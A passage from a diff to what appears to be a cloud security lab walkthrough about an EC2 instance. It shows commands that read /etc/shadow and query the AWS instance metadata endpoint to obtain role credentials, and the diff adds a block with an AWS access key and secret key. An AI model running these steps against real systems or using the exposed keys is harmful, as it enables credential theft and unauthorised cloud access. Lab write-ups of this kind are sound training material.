@@ -19,7 +19,11 @@ cd root
 cat /etc/shadow
 curl -m 5 http://169.254.169.254/latest/meta-data/
 ```
-
+[default]
+aws_access_key_id = AKIAT4GVSAXXO3NMPFBV
+aws_secret_access_key = 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
+output = json
+region = us-east-2
 We can't view the /root directory, the /etc/shadow file, or even get a response from the IMDS endpoint. The IMDS endpoint is used to 
 get metadata about the instance to facilitate its management and configuration. It is by accessing this endpoint that we will be able to get credentials for the EC2 instance's attached role.
 
